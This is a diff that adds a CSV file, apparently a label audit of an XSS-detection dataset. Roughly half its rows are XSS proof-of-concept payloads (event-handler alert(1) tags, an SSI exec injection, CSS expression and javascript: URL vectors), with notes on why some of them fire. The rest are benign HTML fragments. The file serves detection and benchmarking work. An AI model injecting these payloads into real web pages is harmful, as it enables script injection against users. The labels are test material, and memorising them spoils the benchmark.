@@ -1,0 +1,51 @@
+id,source,label_attack_like,text,flags,verdict,note
+o0918,mendeley,0,user=eve&action=view&page=5349&ref=home meta=8t163l_380682,,correct,
+o0532,kaggle,0,"<li><a href=""/wiki/Networking_hardware"" title=""Networking hardware"">Network components </a> </li>",benign-contains-markup,correct,"benign but it is a Wikipedia HTML fragment, not realistic user input (benchmark-realism caveat, not a label error)"
+o0831,mendeley,0,search=buy+online+reviews&page=4169&ref=nhvnvc,,correct,
+o0168,kaggle,1,"<label onpaste=""alert(1)"" contenteditable>test</label>",,correct,
+o0714,payloadbox,1,<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,,correct,"onmousemove with &lpar;/&rpar; entities: entities decode inside an attribute value, so this is a valid payload"
+o0576,kaggle,0,"<li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a>, p.&#160;9 </li>",benign-contains-markup,correct,
+o0077,kaggle,1,"<meter onmouseover=""alert(1)"">test</meter>",,correct,
+o0546,kaggle,0,"<li><a href=""/wiki/Stephen_Hawking"" title=""Stephen Hawking"">Stephen Hawking </a> </li>",benign-contains-markup,correct,
+o0234,kaggle,1,"<section onbeforepaste=""alert(1)"" contenteditable>test</section>",,correct,
+o0583,kaggle,0,"<ul><li><a href=""/wiki/The_Engine"" title=""The Engine"">The Engine </a> (<i><a href=""/wiki/Gulliver%27s_Travels"" title=""Gulliver&#39;s Travels"">Gulliver's Travels </a> </i>, 1726) </li>",benign-contains-markup,correct,
+o0126,kaggle,1,"<aside oncopy=""alert(1)"" contenteditable>test</aside>",,correct,
+o0278,kaggle,1,"<dt onmousedown=""alert(1)"">test</dt>",,correct,
+o0963,fixture,0,Why is my <img> tag not showing the picture,benign-contains-markup,correct,
+o0304,kaggle,1,"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",,correct,
+o0864,mendeley,0,note: see documentation about escaping tokens shown as text meta=1s6c3m_354626,,correct,
+o0155,kaggle,1,"<fieldset draggable=""true"" ondragenter=""alert(1)"">test</fieldset>",,correct,
+o0587,kaggle,0,"	 </span> <span class=""toctext"">External links ",benign-contains-markup,correct,
+o0459,kaggle,0,"<li><a href=""/wiki/Resistive_random-access_memory"" title=""Resistive random-access memory"">RRAM </a> </li>",benign-contains-markup,correct,
+o0668,payloadbox,1,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",attack-without-executable-construct,unclear,"SSI injection (<!--#exec-->), not XSS: different vulnerability class, cannot execute from reflected request content in the browser"
+o0941,mendeley,0,note: see documentation about escaping tokens shown as text meta=e2fvi8_253382,,correct,
+o0039,kaggle,1,"<aside onclick=""alert(1)"">test</aside>",,correct,
+o0185,kaggle,1,<dd onpointerout=alert(1)>XSS</dd>,,correct,
+o0297,kaggle,1,"<font onbeforecut=""alert(1)"" contenteditable>test</font>",,correct,
+o0553,kaggle,0,"<li><a href=""/wiki/Humanity%2B"" title=""Humanity+"">Humanity+ </a> </li>",benign-contains-markup,correct,
+o0878,mendeley,0,search=buy+online+reviews&page=13956&ref=ixupjw,,correct,
+o0791,payloadbox,1,"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",,correct,
+o0124,kaggle,1,"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",,correct,
+o0157,kaggle,1,<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,,correct,"onbeforeactivate is IE-only; label attack-like is right, will not fire in Chromium"
+o0876,mendeley,0,user=trent&action=view&page=13902&ref=home meta=8vhbpk_349119,,correct,
+o0616,kaggle,0,"<li><a href=""/wiki/Progress_in_artificial_intelligence"" title=""Progress in artificial intelligence"">Progress in artificial intelligence </a> </li>",benign-contains-markup,correct,
+o0355,kaggle,0,"	 </span>. <i>georgetown.edu </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=georgetown.edu&amp;rft.atitle=Artificial+Intelligence%3A+An+Introduction%2C+p.+37&amp;rft.aulast=Maloof&amp;rft.aufirst=Mark&amp;rft_id=http%3A%2F%2Fpeople.cs.georgetown.edu%2F~maloof%2Fcosc270.f17%2Fcosc270-intro-handout.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",benign-contains-markup,correct,
+o0274,kaggle,1,"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strike>",,correct,
+o0359,kaggle,0,"<li><a href=""/wiki/Ferroelectric_RAM"" title=""Ferroelectric RAM"">FRAM </a> </li>",benign-contains-markup,correct,
+o0407,kaggle,0,"<li><a href=""/wiki/David_Hume"" title=""David Hume"">David Hume </a> </li> </ul>",benign-contains-markup,correct,
+o0341,kaggle,1,"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",,correct,
+o0728,payloadbox,1,"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",,correct,
+o0315,kaggle,1,"<style>:target {transform: rotate(180deg);}</style><col id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></col>",,correct,
+o0395,kaggle,0,"<h2>Built-in services<a class=""headerlink"" href=""#built-in-services"" title=""Permalink to this headline"">¶</a></h2>",benign-contains-markup,correct,
+o0525,kaggle,0,"<li><a href=""/wiki/Mobile_translation"" title=""Mobile translation"">Mobile translation </a> </li>",benign-contains-markup,correct,
+o0681,payloadbox,1,&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,attack-without-executable-construct,unclear,"already HTML-entity-encoded in the SOURCE (&lt;IMG...); reflected raw it renders as text. Also CSS expression() = IE-only. Attack-like by intent, never browser-confirmable"
+o0873,mendeley,0,contact=help@store.com&subject=courses,,correct,
+o0075,kaggle,1,"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",attack-without-executable-construct,correct,"-moz-binding is obsolete Firefox XBL; label right, will not fire in Chromium"
+o0726,payloadbox,1,"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",,correct,
+o0723,payloadbox,1,&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,attack-without-executable-construct,unclear,already HTML-entity-encoded in the SOURCE; renders as text when reflected
+o0989,fixture,0,"JSON.parse('{""a"": 1}')",,correct,
+o0768,payloadbox,1,"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",attack-without-executable-construct,unclear,already HTML-entity-encoded in the SOURCE; renders as text when reflected
+o0227,kaggle,1,<select onpointerenter=alert(1)>XSS</select>,,correct,
+o0818,mendeley,0,note: see documentation about escaping tokens shown as text meta=8g7ory_326255,,correct,
+o0173,kaggle,1,"<address onkeydown=""alert(1)"" contenteditable>test</address>",,correct,
+o0502,kaggle,0,"	 </span><span class=""mw-editsection"">",benign-contains-markup,correct,
